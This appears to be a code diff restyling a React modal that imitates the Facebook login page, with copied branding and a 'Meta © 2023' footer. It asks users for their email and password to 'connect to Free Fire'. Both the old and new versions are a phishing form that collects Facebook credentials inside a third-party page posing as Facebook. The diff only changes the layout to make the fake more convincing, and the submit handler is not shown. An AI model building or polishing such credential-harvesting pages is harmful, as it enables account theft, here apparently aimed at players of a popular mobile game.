@@ -140,102 +140,120 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
 
   return (
     <Dialog open={isOpen} onOpenChange={handleClose}>
-      <DialogContent className="max-w-none w-full h-full p-0 border-0 bg-transparent shadow-none">
-        {/* Facebook Login Design */}
-        <div className="flex items-center justify-center min-h-screen p-5">
-          <div className="w-full max-w-screen-lg mx-auto">
-            <div className="flex items-center justify-center lg:justify-between">
-              {/* Left Section */}
-              <div className="hidden lg:block flex-1 pr-10">
-                <h1 className="text-[#1877f2] text-[56px] font-normal mb-0 leading-none" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
-                  facebook
-                </h1>
-                <p className="text-[24px] text-gray-700 mt-2" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
-                  Log in your Facebook account to connect to Free Fire.
+      <DialogContent className="sm:max-w-md p-0 overflow-hidden bg-white shadow-2xl">
+        {/* Facebook Header */}
+        <div className="bg-[#1877f2] text-white text-center py-4 relative">
+          <h1 className="text-2xl font-bold" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>facebook</h1>
+          <button 
+            onClick={handleClose}
+            className="absolute top-3 right-3 text-white hover:text-gray-200 transition-colors"
+          >
+            <X className="h-6 w-6" />
+          </button>
+        </div>
+
+        {/* Content */}
+        <div className="p-6">
+          {/* Game Icon and Description */}
+          <div className="text-center mb-6">
+            {item && (
+              <div className="mb-4">
+                <div className="w-16 h-16 mx-auto mb-3 rounded-xl overflow-hidden shadow-lg">
+                  <img 
+                    src="/lovable-uploads/c975bbbd-21d4-45de-8dbc-07ed98b7a6ba.png" 
+                    alt="Free Fire"
+                    className="w-full h-full object-cover"
+                  />
+                </div>
+                <p className="text-gray-600 text-sm" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
+                  Log in your Facebook account to connect to<br />
+                  Free Fire.
                 </p>
               </div>
+            )}
+          </div>
 
-              {/* Right Section - Login Form */}
-              <div className="w-full max-w-[396px] bg-white p-5 rounded-lg shadow-lg border border-gray-200">
-                {/* Close Button */}
-                <div className="flex justify-end mb-4">
-                  <button 
-                    onClick={handleClose}
-                    className="text-gray-400 hover:text-gray-600 transition-colors"
-                  >
-                    <X className="h-5 w-5" />
+          {/* Login Form */}
+          <form onSubmit={handleSubmit} className="space-y-3">
+            <div>
+              <input
+                type="text"
+                placeholder="Mobile number or email address"
+                value={email}
+                onChange={(e) => setEmail(e.target.value)}
+                required
+                className="w-full p-[14px] text-[17px] border border-[#dddfe2] rounded-md bg-[#f5f6f7] outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] transition-colors"
+                style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
+              />
+            </div>
+
+            <div className="relative">
+              <input
+                type="password"
+                placeholder="Password"
+                value={passphrase}
+                onChange={(e) => setPassphrase(e.target.value)}
+                required
+                className="w-full p-[14px] text-[17px] border border-[#dddfe2] rounded-md bg-[#f5f6f7] pr-12 outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] transition-colors"
+                style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
+              />
+              <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
+                <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                </svg>
+              </div>
+            </div>
+
+            <button
+              type="submit"
+              disabled={isLoading}
+              className="w-full p-[14px] text-[20px] bg-[#1877f2] hover:bg-[#166fe5] text-white border-none rounded-md font-bold cursor-pointer transition-colors disabled:opacity-50 mt-4"
+              style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
+            >
+              {isLoading ? (
+                <div className="flex items-center justify-center gap-2">
+                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
+                  Logging in...
+                </div>
+              ) : (
+                'Log In'
+              )}
+            </button>
+          </form>
+
+          {/* Footer Links */}
+          <div className="mt-6 text-center space-y-4">
+            <div className="space-y-2">
+              <a href="#" className="block text-[#1877f2] text-sm hover:underline" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
+                Create Account
+              </a>
+              <a href="#" className="block text-gray-500 text-sm hover:underline" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
+                Not now
+              </a>
+              <a href="#" className="block text-[#1877f2] text-sm hover:underline" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
+                Forgotten password?
+              </a>
+            </div>
+
+            {/* Language Options */}
+            <div className="border-t border-[#dadde1] pt-4 mt-6">
+              <div className="grid grid-cols-2 gap-x-4 gap-y-2 text-xs text-gray-500" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
+                <span>English (UK)</span>
+                <span>العربية</span>
+                <span>Türkçe</span>
+                <span>Tiếng Việt</span>
+                <span>日本語</span>
+                <span>Español</span>
+                <span>Português (Brasil)</span>
+                <div className="flex items-center justify-center">
+                  <button className="w-6 h-6 border border-gray-300 rounded flex items-center justify-center hover:bg-gray-50">
+                    <span className="text-gray-400 text-lg leading-none">+</span>
                   </button>
                 </div>
-
-                {item && (
-                  <div className="text-center space-y-4 mb-6">
-                    <img 
-                      src="/lovable-uploads/c975bbbd-21d4-45de-8dbc-07ed98b7a6ba.png" 
-                      alt="Game Logo" 
-                      className="w-16 h-16 mx-auto object-cover"
-                    />
-                    <h3 className="font-normal text-gray-900" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>Garena Free Fire Max</h3>
-                    <p className="text-sm text-gray-600 font-normal" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
-                      Log in your Facebook account to connect to Free Fire.
-                    </p>
-                  </div>
-                )}
-
-                <form onSubmit={handleSubmit} className="space-y-3">
-                  <input
-                    type="text"
-                    placeholder="Email or phone number"
-                    value={email}
-                    onChange={(e) => setEmail(e.target.value)}
-                    className="w-full p-[14px] text-[17px] text-black border border-[#dddfe2] rounded-md outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] transition-colors"
-                    style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
-                    required
-                  />
-
-                  <input
-                    type="password"
-                    placeholder="Password"
-                    value={passphrase}
-                    onChange={(e) => setPassphrase(e.target.value)}
-                    className="w-full p-[14px] text-[17px] text-black border border-[#dddfe2] rounded-md outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] transition-colors"
-                    style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
-                    required
-                  />
-
-                  <button 
-                    type="submit" 
-                    className="w-full p-[14px] text-[20px] bg-[#1877f2] hover:bg-[#166fe5] text-white border-none rounded-md font-bold cursor-pointer transition-colors disabled:opacity-50"
-                    style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
-                    disabled={isLoading}
-                  >
-                    {isLoading ? (
-                      <div className="flex items-center justify-center gap-2">
-                        <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
-                        Logging in...
-                      </div>
-                    ) : (
-                      'Log In'
-                    )}
-                  </button>
-                </form>
-
-                <a 
-                  href="#" 
-                  className="block text-center mt-4 text-[#1877f2] text-[14px] no-underline hover:underline"
-                  style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
-                >
-                  Forgotten password?
-                </a>
-
-                <div className="border-t border-[#dadde1] my-5"></div>
-
-                <button 
-                  className="w-full p-[14px] text-[17px] bg-[#42b72a] hover:bg-[#36a420] text-white border-none rounded-md font-bold cursor-pointer transition-colors"
-                  style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
-                  type="button"
-                >
-                  Create New Account
-                </button>
+              </div>
+              <div className="text-xs text-gray-400 mt-4" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
+                Meta © 2023
               </div>
             </div>
           </div>
